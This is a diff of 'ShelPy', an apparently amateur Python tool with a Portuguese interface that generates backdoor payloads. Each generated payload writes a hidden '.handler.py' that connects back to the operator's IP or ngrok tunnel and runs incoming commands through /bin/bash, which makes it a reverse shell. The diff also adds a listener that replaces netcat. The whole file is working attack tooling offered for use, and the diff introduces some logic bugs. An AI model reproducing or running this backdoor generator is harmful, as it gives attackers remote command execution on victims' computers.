@@ -1,155 +1,311 @@
 #coding: utf-8
-#Developer: Derxs
+# Developer: Derxs
+# Version: 1.2
 import os, time, socket
 
 def criar():
-	ngrok = input("\033[01;32m[*]\033[00;00m"+" Ngrok [y/n]> ")
+	ngrok = input("\033[01;32m[*]\033[0m"+" Ngrok [y/n]> ")
 
 	if ngrok == "y":
-		ip = input("\033[01;34m[+]\033[00;00m"+" IP ngrok> ")
-		porta = input("\033[01;34m[+]\033[00;00m"+" Porta ngrok> ")
-		porta_hand = input("\033[01;34m[+]\033[00;00m"+" Porta handler> ")
-		nome = input("\033[01;34m[+]\033[00;00m"+" Nome da backdoor> ")
+		ip = input("\033[01;34m[+]\033[0m"+" IP ngrok> ")
+		porta = input("\033[01;34m[+]\033[0m"+" Porta ngrok> ")
+		porta_hand = input("\033[01;34m[+]\033[0m"+" Porta handler> ")
+		nome = input("\033[01;34m[+]\033[0m"+" Nome da backdoor> ")
 		
 		arquivo = open(nome+".py", "w")	
 		
-		print("\033[01;32m[*]\033[00;00m"+" Criando backdoor...")
+		print("\033[01;32m[*]\033[0m"+" Criando backdoor...")
 		
 		arquivo.write("""#coding: utf-8
 import os, time
 
 arq = open(".handler.py", "w")
 arq.write('''#coding: utf-8
-import socket, subprocess, os
+import socket, os, subprocess
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-ip = "{}"
+s = socket.socket()
+host = {}
 port = {}
 
-try:
-	s.connect((ip, port))
-except ConnectionRefusedError:
-	s.close()
+s.connect((host, port))
 
-if s:
-	try:
-		s.send(bytes("\033[01;31mShelPy>>>\033[00;00m ", 'utf-8'))
-	except BrokenPipeError:
-		pass
+s.send(str.encode('\033[01;31mShelPy\033[0m'+str(os.getcwd()) + '> '))
 
-	while True:
-		dados = s.recv(1024)
+while True:
+	data = s.recv(1024)
 
-		proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	if data[:2].decode('utf-8') == 'cd':
+		os.chdir(data[3:].decode('utf-8'))
+	
+	if len(data) > 0:
+		cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, executable='/bin/bash', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		
+		output_bytes = cmd.stdout.read() + cmd.stderr.read()
 
-		saida = proc.stdout.read() + proc.stderr.read()
+		if 'Arquivo ou diretório não encontrado' or 'File or directory not found' in str(output_bytes, 'utf-8'):
+			output_str = str(cmd.stdout.read(), 'utf-8')
+		else:
+			output_str = str(output_bytes, 'utf-8')
 
-		try:
-			s.send(bytes(saida))
-			s.send(bytes("\033[01;31mShelPy>>>\033[00;00m ", 'utf-8'))
-		except BrokenPipeError:
-			pass
-
+		s.send(str.encode(output_str + str(os.getcwd()) + '> '))
 ''')
 
 arq.close()
 
 os.system("python3 .handler.py &>> /dev/null")
-		""".format(ip, porta))
+		""".format('"{}"'.format(ip), porta))
 	
 		arquivo.close()
 
-		print("\033[01;32m[*]\033[00;00m"+" Backdoor gerada!")
+		print("\033[01;32m[*]\033[0m"+" Backdoor gerada!")
 	
-		print("\033[01;32m[*]\033[00;00m"+" Aguardando conexão...")
+		print("\033[01;32m[*]\033[0m"+" Aguardando conexão...")
 
-		os.system("nc -lp {}".format(porta_hand))
+		def socket_create():
+			try:
+				global host, port, s
+				
+				host = ''
+				port = 1337
 
+				s = socket.socket()
+
+			except socket.error as msg:
+				print('\033[01;31m[!]\033[0m Erro na criação do socket: {}'.format(msg))
+
+		def socket_bind():
+			try:
+				global host, port, s
+				
+				s.bind((host, port))
+				s.listen(5)
+			
+			except socket.error as msg:
+				print('\033[01;31m[!]\033[0m Socket bind erro: {}\n\033[01;32m[+]\033[0m Reconectando...'.format(msg))
+				socket_bind()
+
+		def socket_accept():
+			conn, address = s.accept()
+			
+			os.system('clear')
+
+			print('\033[01;32m[*] IP Conectado:\033[0m {}\n'.format(address[0]))
+
+			client_response = str(conn.recv(1024), 'utf-8')
+			
+			print(client_response, end='')
+			
+			send_commands(conn)
+			conn.close()
+
+		def send_commands(conn):
+			while True:
+				cmd = input()
+
+				if cmd == 'sair':
+					conn.close()
+					s.close()
+
+				if len(str.encode(cmd)) > 0:
+					conn.send(str.encode(cmd))
+					client_response = str(conn.recv(1024), 'utf-8')
+					print(client_response, end='')
+
+		def main_server():
+			socket_create()
+			socket_bind()
+			socket_accept()
+
+		main_server()
 		main()
 	else:
-		ip = input("\033[01;34m[+]\033[00;00m"+" Seu IP> ")
+		ip = input("\033[01;34m[+]\033[0m"+" Seu IP> ")
 	
-		porta = input("\033[01;34m[+]\033[00;00m"+" Porta> ")
+		porta = input("\033[01;34m[+]\033[0m"+" Porta> ")
 	
-		nome = input("\033[01;34m[+]\033[00;00m"+" Nome da backdoor> ")
+		nome = input("\033[01;34m[+]\033[0m"+" Nome da backdoor> ")
 		arquivo = open(nome+".py", "w")
 	
-		print("\033[01;32m[*]\033[00;00m"+" Criando backdoor...")
+		print("\033[01;32m[*]\033[0m"+" Criando backdoor...")
 	
 		arquivo.write("""#coding: utf-8
 import os, time
 
 arq = open(".handler.py", "w")
 arq.write('''#coding: utf-8
-import socket, subprocess, os
+import socket, os, subprocess
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-ip = "{}"
+s = socket.socket()
+host = {}
 port = {}
 
-try:
-	s.connect((ip, port))
-except ConnectionRefusedError:
-	s.close()
+s.connect((host, port))
 
-if s:
-	try:
-		s.send(bytes("\033[01;31mShelPy>>>\033[00;00m ", 'utf-8'))
-	except BrokenPipeError:
-		pass
+s.send(str.encode('\033[01;31mShelPy\033[0m'+str(os.getcwd()) + '> '))
 
-	while True:
-		dados = s.recv(1024)
+while True:
+	data = s.recv(1024)
 
-		proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	if data[:2].decode('utf-8') == 'cd':
+		os.chdir(data[3:].decode('utf-8'))
+	
+	if len(data) > 0:
+		cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, executable='/bin/bash', stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		
+		output_bytes = cmd.stdout.read() + cmd.stderr.read()
 
-		saida = proc.stdout.read() + proc.stderr.read()
+		if 'Arquivo ou diretório não encontrado' or 'File or directory not found' in str(output_bytes, 'utf-8'):
+			output_str = str(cmd.stdout.read(), 'utf-8')
+		else:
+			output_str = str(output_bytes, 'utf-8')
 
-		try:
-			s.send(bytes(saida))
-			s.send(bytes("\033[01;31mShelPy>>>\033[00;00m ", 'utf-8'))
-		except BrokenPipeError:
-			pass
-
+		s.send(str.encode(output_str + str(os.getcwd()) + '> '))
 ''')
 
 arq.close()
 
 os.system("python3 .handler.py &>> /dev/null")
-		""".format(ip, porta))
+		""".format('"{}"'.format(ip), porta))
 	
 		arquivo.close()
 
-		print("\033[01;32m[*]\033[00;00m"+" Backdoor gerada!")
+		print("\033[01;32m[*]\033[0m"+" Backdoor gerada!")
 	
-		print("\033[01;32m[*]\033[00;00m"+" Aguardando conexão...")
+		print("\033[01;32m[*]\033[0m"+" Aguardando conexão...")
 
-		os.system("nc -lp {}".format(porta))
+		def socket_create():
+			try:
+				global host, port, s
+				
+				host = ''
+				port = 1337
 
+				s = socket.socket()
+
+			except socket.error as msg:
+				print('\033[01;31m[!]\033[0m Erro na criação do socket: {}'.format(msg))
+
+		def socket_bind():
+			try:
+				global host, port, s
+				
+				s.bind((host, port))
+				s.listen(5)
+			
+			except socket.error as msg:
+				print('\033[01;31m[!]\033[0m Socket bind erro: {}\n\033[01;32m[+]\033[0m Reconectando...'.format(msg))
+				socket_bind()
+
+		def socket_accept():
+			conn, address = s.accept()
+			
+			os.system('clear')
+
+			print('\033[01;32m[*] IP Conectado:\033[0m {}\n'.format(address[0]))
+
+			client_response = str(conn.recv(1024), 'utf-8')
+			
+			print(client_response, end='')
+			
+			send_commands(conn)
+			conn.close()
+
+		def send_commands(conn):
+			while True:
+				cmd = input()
+
+				if cmd == 'sair':
+					conn.close()
+					s.close()
+
+				if len(str.encode(cmd)) > 0:
+					conn.send(str.encode(cmd))
+					client_response = str(conn.recv(1024), 'utf-8')
+					print(client_response, end='')
+
+		def main_server():
+			socket_create()
+			socket_bind()
+			socket_accept()
+
+		main_server()
 		main()
 
 def handler():
-	porta = input("\033[01;34m[+]\033[00;00m"+" Porta> ")
-	print("\033[01;32m[*]\033[00;00m"+" Aguardando conexão...")
+	porta = input("\033[01;34m[+]\033[0m"+" Porta> ")
+	print("\033[01;32m[*]\033[0m"+" Aguardando conexão...")
 
-	os.system("nc -lp {}".format(porta))
+	def socket_create():
+		try:
+			global host, port, s
+			
+			host = ''
+			port = 1337
+
+			s = socket.socket()
+
+		except socket.error as msg:
+			print('\033[01;31m[!]\033[0m Erro na criação do socket: {}'.format(msg))
+
+	def socket_bind():
+		try:
+			global host, port, s
+			
+			s.bind((host, port))
+			s.listen(5)
+		
+		except socket.error as msg:
+			print('\033[01;31m[!]\033[0m Socket bind erro: {}\n\033[01;32m[+]\033[0m Reconectando...'.format(msg))
+			socket_bind()
+
+	def socket_accept():
+		conn, address = s.accept()
+		
+		os.system('clear')
+
+		print('\033[01;32m[*] IP Conectado:\033[0m {}\n'.format(address[0]))
+
+		client_response = str(conn.recv(1024), 'utf-8')
+		
+		print(client_response, end='')
+		
+		send_commands(conn)
+		conn.close()
+
+	def send_commands(conn):
+		while True:
+			cmd = input()
+
+			if cmd == 'sair':
+				conn.close()
+				s.close()
+
+			if len(str.encode(cmd)) > 0:
+				conn.send(str.encode(cmd))
+				client_response = str(conn.recv(1024), 'utf-8')
+				print(client_response, end='')
+
+	def main_server():
+		socket_create()
+		socket_bind()
+		socket_accept()
+
+	main_server()
 
 def main():
 	print('''\033[01;31m
 ╔═╗┬ ┬┌─┐┬  ╔═╗┬ ┬
 ╚═╗├─┤├┤ │  ╠═╝└┬┘
-╚═╝┴ ┴└─┘┴─┘╩   ┴ v1.1 by Derxs
-\033[00;00m
-\033[01;34m1)\033[00;00m Criar
-\033[01;34m2)\033[00;00m Handler
-\033[01;34m3)\033[00;00m Limpar tela
-\033[01;34m4)\033[00;00m Sair
+╚═╝┴ ┴└─┘┴─┘╩   ┴ v1.2 by Derxs
+\033[0m
+\033[01;34m1)\033[0m Criar
+\033[01;34m2)\033[0m Handler
+\033[01;34m3)\033[0m Limpar tela
+\033[01;34m4)\033[0m Sair
 	''')
 
 	try:
-		opc = int(input("\033[01;35m[?]\033[00;00m ShelPy> "))
+		opc = int(input("\033[01;35m[?]\033[0m ShelPy> "))
 		if opc == 1:
 			criar()
 		elif opc == 2:
@@ -168,5 +324,5 @@ while flag:
 	try:
 		main()
 	except KeyboardInterrupt:
-		print("\n\033[01;31m[!]\033[00;00m"+" Você saiu!")
+		print("\n\033[01;31m[!]\033[0m"+" Você saiu!")
 		flag = False
